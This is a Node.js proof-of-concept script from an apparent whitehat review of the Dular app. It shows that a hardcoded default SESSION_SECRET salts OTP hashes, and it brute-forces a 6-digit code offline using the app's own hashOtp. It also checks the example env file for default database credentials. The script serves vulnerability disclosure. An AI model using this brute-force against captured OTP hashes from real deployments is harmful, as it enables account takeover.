// ckb-whitehat PoC — Dular: F5 known SESSION_SECRET default salts every OTP
//
// The target's own server/config.js line:
//   sessionSecret: process.env.SESSION_SECRET || 'dev-session-secret-change-me'
// and server/utils.js:  hashOtp(phone, code) = sha256(`${config.sessionSecret}:${phone}:${code}`)
// A deploy that forgets the env var salts EVERY OTP hash with a public literal
// shipped in source, so a captured (phone, otp_hash) row is brute-forceable
// offline (900k codespace of 6-digit codes).
//
// This PoC imports the TARGET's real config.js (with SESSION_SECRET deliberately
// unset, i.e. the attacker's knowledge of the shipped default) and the target's
// REAL hashOtp(), mints a hash exactly as the app would, then recovers the
// code with a plain offline brute-force of that hash — asserting the recovery,
// not a reimplemented hash.
//
// Run: node f5-secret-default.mjs
// Env:  DULAR_DIR=<repo root>   (or a server/ dir — both accepted)

import { createHash } from 'node:crypto'
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import { resolveTarget, targetImport, line } from './target.mjs'

// The attacker's view: no SESSION_SECRET set, so config.js falls back to the
// shipped default. Unset it explicitly so a developer's own env can't mask it.
delete process.env.SESSION_SECRET
process.env.DATABASE_URL = process.env.DATABASE_URL || 'postgres://dular:dular@127.0.0.1:5433/dular'

const main = async () => {
  const { repoRoot, serverDir } = resolveTarget()
  console.log(`target: ${repoRoot}`)

  line('F5 — known SESSION_SECRET default is the target\'s live OTP salt')
  const { config } = await targetImport(serverDir, 'config.js')
  const { hashOtp } = await targetImport(serverDir, 'utils.js')

  const phone = '+254700000004'
  const targetCode = '334567' // a plausible 6-digit M-Pesa-style code
  const otpHash = hashOtp(phone, targetCode) // the target's real hash
  console.log(`target config.sessionSecret (no env var) = ${JSON.stringify(config.sessionSecret)}`)
  console.log(`OTP hash minted by target hashOtp(phone, ${targetCode}) = ${otpHash}`)

  // Offline brute-force of the app's real hash. We know the salt only because
  // it is the public default — this is the whole finding.
  let t0 = performance.now()
  let found = null
  for (let code = 100000; code <= 999999; code++) {
    if (hashOtp(phone, String(code)) === otpHash) { found = String(code); break }
  }
  const t1 = performance.now()
  console.log(`brute-forced code ${found} in ${((t1 - t0) / 1000).toFixed(2)} s (900,000-keyspace, target's own hashOtp)`)

  // .env.example: does it ship the same foot-guns (DEMO_MODE default, DB creds)?
  const envExample = await readFile(path.join(repoRoot, '.env.example'), 'utf8').catch(() => '')
  console.log('.env.example ships DEMO_MODE=true:', /DEMO_MODE=true/.test(envExample),
    '| DB creds postgres://dular:dular@ present:', /postgres:\/\/dular:dular@/.test(envExample))

  const fired = found === targetCode
  console.log(fired
    ? 'FINDING F5 FIRED — any deploy without a real SESSION_SECRET exposes every OTP to a <2s offline brute-force'
    : 'FINDING F5 UNPROVEN')
  process.exit(fired ? 0 : 1)
}

main().catch((e) => { console.error('F5 PoC error:', e); process.exit(2) })
